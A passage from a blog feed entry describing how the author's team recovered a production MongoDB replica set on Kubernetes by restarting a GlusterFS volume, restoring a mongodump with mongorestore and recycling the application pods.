style="color:#36acaa">198</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Brick node2:/var/lib/heketi/mounts/vg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">_3cf3e12449047bba9b1260d301914187/brick_3ea</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">27507e65df9ec9a4c0841d27962f9/brick </span><span class="token number" style="color:#36acaa">49153</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> N </span><span class="token number" style="color:#36acaa">198</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Brick node3:/var/lib/heketi/mounts/vg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">_78c5285b77bde0e7ed344df72ef5c630/brick_d54</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3d1ea6e83036e7796a89b1594f4cc/brick </span><span class="token number" style="color:#36acaa">49152</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> N </span><span class="token number" style="color:#36acaa">186</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Self-heal Daemon on localhost N/A N/A Y </span><span class="token number" style="color:#36acaa">177</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Self-heal Daemon on node1 N/A N/A Y </span><span class="token number" style="color:#36acaa">183</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Self-heal Daemon on node1 N/A N/A Y </span><span class="token number" style="color:#36acaa">189</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We noticed that none of the bricks on <code>node{1,2,3}</code> were online so we decided to restart it:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gluster volume stop heketidbstorage </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gluster volume start heketidbstorage</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This resulted in all bricks on all nodes getting back online, released the GlusterFS <code>PVC</code> provisioning and allowed all MongoDB replicaset member <code>Pod</code>s to initialize successfully!</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="restoring-mongodb-and-the-application">Restoring MongoDB and the Application<a href="https://kbbgl.github.io/blog/prod-down-mongodb-corrupt-heketi-glusterfs-provisioning#restoring-mongodb-and-the-application" class="hash-link" aria-label="Direct link to Restoring MongoDB and the Application" title="Direct link to Restoring MongoDB and the Application">​</a></h2>
<p>At this point, 3 intense and excruciating hours have passed, we had gone through a set a complex problems and we were all hoping that the last phase would result in a recovery of the MongoDB and the application.
We had the GlusterFS <code>PVC</code> provisioned, we had all 3 MongoDB replica set <code>Pod</code>s up. All that was left was to:</p>
<ol>
<li>
<p>Copy the <code>mongodump</code> from the host machine to the master MongoDB replica set:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Find out who is the master</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> kubectl </span><span class="token builtin class-name">exec</span><span class="token plain"> mongodb-replicaset-0 </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> mongodb-replicaset -- mongo </span><span class="token parameter variable" style="color:#36acaa">--eval</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'db.isMaster().primary'</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">--quiet</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mongodb-replicaset-0.mongodb-replicaset.svc.cluster.local:27017</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Copy the mongodump into the master Pod</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> kubectl </span><span class="token function" style="color:#d73a49">cp</span><span class="token plain"> /tmp/mongodb0/mongodump mongodb-replicaset-0 </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> mongodb-replicaset:/tmp/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
<li>
<p>Run <code>mongorestore</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Restore the database</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> kubectl </span><span class="token builtin class-name">exec</span><span class="token plain"> mongodb-replicaset-0 </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> mongodb-replicaset -- mongorestore </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> prod </span><span class="token parameter variable" style="color:#36acaa">--drop</span><span class="token plain"> /tmp/mongodump/prod</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
<li>
<p>Clear cache by deleting all <code>Pod</code>s in the application namespace:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> kubectl delete pod </span><span class="token parameter variable" style="color:#36acaa">--all</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-n</span><span class="token plain"> prod</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
</ol>
<p>Voila! All Pods started successfully and the application was loading again!</p>]]></content>
        <author>
            <name>Kobbi Gal</name>
            <uri>https://github.com/kbbgl</uri>
        </author>
        <category label="Cluster" term="Cluster"/>
        <category label="Gluster" term="Gluster"/>
        <category label="Glusterfs" term="Glusterfs"/>
        <category label="Heketi" term="Heketi"/>
        <category label="Kubectl" term="Kubectl"/>
        <category label="Kubernetes" term="Kubernetes"/>
        <category label="Mongo" term="Mongo"/>
        <category label="Mongodb" term="Mongodb"/>
        <category label="Production" term="Production"/>
        <category label="Troubleshooting" term="Troubleshooting"/>
    </entry>
</feed>